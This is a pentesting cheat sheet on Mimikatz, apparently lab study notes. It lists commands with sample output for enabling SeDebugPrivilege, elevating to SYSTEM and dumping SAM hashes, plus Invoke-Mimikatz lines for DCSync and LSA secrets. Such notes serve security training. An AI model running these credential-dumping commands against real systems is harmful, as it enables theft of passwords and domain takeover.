---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Mimikatz

Each command in `mimikatz` consists of a module and a command delimited by two colons (`module::command`).&#x20;

## SAM

**NTML** stores unsalted hashed passwords in **SAM**.  **Local Security Authority System (LSASS)** runs with `SYSTEM` privileges and caches NTLM hashes.

1. We can extract the NTML hashes if we have `Administrator` / `SYSTEM` privileges and the `SeDebugPrivilege` access right enabled. We can enable the latter with `privilege::debug`.
2. We can use `token::elevate` module to elevate our privileges to `SYSTEM` if we have the `SeImpersonatePrivilege` access right. All local administrators have it by default.

{% tabs %}
{% tab title="1. Enable SeDebugPrivilege" %}
```powershell
mimikatz # privilege::debug
Privilege '20' OK
```
{% endtab %}

{% tab title="2. Escalate to SYSTEM" %}
{% code overflow="wrap" %}
```powershell
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

660     {0;000003e7} 1 D 41815          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;001035c2} 2 F 1710035     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1981690     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```
{% endcode %}
{% endtab %}

{% tab title="Dump SAM" %}
```powershell
mimikatz # lsadump::sam
<SNIP>

RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10

<SNIP>
```
{% endtab %}
{% endtabs %}

## Other

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\administrator"'
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::secrets" "exit"'
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
.\mimikatz.exe privilege::debug token::elevate lsadump::secrets exit 
```
{% endcode %}

## Resources

{% tabs %}
{% tab title="mimikatz.exe" %}
{% embed url="https://github.com/gentilkiwi/mimikatz/" %}
{% endtab %}

{% tab title="Invoke-Mimikatz.ps1" %}
{% embed url="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1" %}
{% endtab %}
{% endtabs %}
